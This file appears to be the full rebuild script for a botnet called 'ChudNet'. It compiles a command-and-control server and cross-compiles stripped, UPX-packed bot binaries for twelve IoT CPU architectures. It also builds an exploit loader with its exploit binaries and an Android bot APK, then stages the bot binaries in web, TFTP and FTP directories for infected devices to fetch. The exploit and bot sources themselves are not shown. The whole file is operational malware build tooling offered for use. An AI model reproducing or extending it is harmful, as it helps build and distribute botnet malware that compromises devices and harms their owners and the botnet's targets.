#!/bin/bash
# ChudNet full rebuild script
# Builds everything: CNC, bot (12 archs), exploit loader, APK
# Run after code changes for testing
set -e

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
RELEASE_DIR="$HOME/release"
mkdir -p "$RELEASE_DIR" "$RELEASE_DIR/payloads"

MUSL_DIR="/etc/xcompile/musl"

echo ""
echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║         ChudNet Full Rebuild             ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
echo ""

# ──────────────────────────────────────────────
#  1. CNC
# ──────────────────────────────────────────────
info "Building CNC..."
(cd "$SCRIPT_DIR/cnc" && go build -o "$RELEASE_DIR/c2_server" .) && {
    cp "$RELEASE_DIR/c2_server" "$SCRIPT_DIR/c2_server" 2>/dev/null || true
    ok "CNC built: $RELEASE_DIR/c2_server"
    ok "Config copied to $RELEASE_DIR/config"
}

# ──────────────────────────────────────────────
#  2. Bot (all architectures)
# ──────────────────────────────────────────────
BOT_SRCS=$(find "$SCRIPT_DIR/bot" -name '*.c' | sort | tr '\n' ' ')
BOT_CFLAGS="-std=c99 -Os -fomit-frame-pointer -fno-stack-protector -s -static"
BOT_INCLUDES="-I$SCRIPT_DIR/bot/core/headers -I$SCRIPT_DIR/bot/attack/headers -I$SCRIPT_DIR/bot/system/headers -I$SCRIPT_DIR/bot/proxy/headers"

info "Building bot (cross-compile)..."
for entry in \
    "arm-linux-musleabi:chud.arm" \
    "armv5l-linux-musleabi:chud.arm5" \
    "armv6-linux-musleabi:chud.arm6" \
    "armv7l-linux-musleabihf:chud.arm7" \
    "i486-linux-musl:chud.x86" \
    "mips-linux-musl:chud.mips" \
    "mipsel-linux-musl:chud.mpsl" \
    "powerpc-linux-musl:chud.ppc" \
    "x86_64-linux-musl:chud.x86_64" \
    "sh4-linux-musl:chud.sh4" \
    "m68k-linux-musl:chud.m68k" \
    "arc-linux-musl:chud.arc"; do
    PREFIX="${entry%%:*}"
    OUTPUT="${entry#*:}"
    GCC="$MUSL_DIR/$PREFIX/bin/${PREFIX}-gcc"
    [ ! -x "$GCC" ] && { warn "  Skipping $OUTPUT (no compiler)"; continue; }
    info "  $OUTPUT..."
    "$GCC" $BOT_CFLAGS $BOT_INCLUDES $BOT_SRCS -o "$RELEASE_DIR/$OUTPUT" 2>/dev/null && {
        strip -s "$RELEASE_DIR/$OUTPUT" 2>/dev/null || true
        upx --lzma "$RELEASE_DIR/$OUTPUT" 2>/dev/null || true
        ok "    $OUTPUT ($(du -h "$RELEASE_DIR/$OUTPUT" | cut -f1))"
    } || warn "    Failed $OUTPUT"
done

info "Building bot (host gcc)..."
if gcc $BOT_CFLAGS $BOT_INCLUDES $BOT_SRCS -o "$RELEASE_DIR/chud.host" 2>/dev/null; then
    strip -s "$RELEASE_DIR/chud.host" 2>/dev/null || true
    ok "  chud.host ($(du -h "$RELEASE_DIR/chud.host" | cut -f1))"
elif gcc -std=c99 -Os -fomit-frame-pointer -fno-stack-protector -s $BOT_INCLUDES $BOT_SRCS -o "$RELEASE_DIR/chud.host" 2>/dev/null; then
    ok "  chud.host (dynamic) ($(du -h "$RELEASE_DIR/chud.host" | cut -f1))"
else
    warn "  Host bot build failed"
fi

# ──────────────────────────────────────────────
#  3. Exploit loader
# ──────────────────────────────────────────────
info "Building exploit loader..."
cp -r "$SCRIPT_DIR/loader/exploits" "$RELEASE_DIR/exploits"
cd "$SCRIPT_DIR/loader"
go build -o "$RELEASE_DIR/loader" . && ok "Loader built: $RELEASE_DIR/loader"
cd "$SCRIPT_DIR"
"$RELEASE_DIR/loader" --build-only && ok "Exploit binaries built"

# ──────────────────────────────────────────────
#  5. APK (Android bot)
# ──────────────────────────────────────────────
if [ -d "$SCRIPT_DIR/apk" ]; then
    info "Building Android APK..."
    if [ -n "$ANDROID_HOME" ] || [ -d "/opt/android-sdk" ] || [ -d "$HOME/Android/Sdk" ]; then
        (cd "$SCRIPT_DIR/apk" && bash build_apk.sh localhost 7777 2>/dev/null) && {
            cp "$SCRIPT_DIR/apk/app/build/outputs/apk/release/"*.apk "$RELEASE_DIR/" 2>/dev/null || true
            ok "  APK built"
        } || warn "  APK build failed (SDK issue?)"
    else
        warn "  Skipping APK (no Android SDK). Set ANDROID_HOME to enable."
    fi
fi

# ──────────────────────────────────────────────
#  6. Sync bins to serving dirs
# ──────────────────────────────────────────────
if [ -d "/var/www/html/bins" ]; then
    cp "$RELEASE_DIR"/chud.* /var/www/html/bins/ 2>/dev/null || true
    cp "$RELEASE_DIR"/chud.* /var/lib/tftpboot/ 2>/dev/null || true
    cp "$RELEASE_DIR"/chud.* /var/ftp/ 2>/dev/null || true
    info "Bins synced to serving directories"
fi

# ──────────────────────────────────────────────
#  Summary
# ──────────────────────────────────────────────
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║         Rebuild Complete!                ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo -e "  Release dir: ${CYAN}$RELEASE_DIR${NC}"
ls -1 "$RELEASE_DIR" 2>/dev/null | while read f; do
    echo -e "    ${CYAN}$f${NC}"
done
echo ""
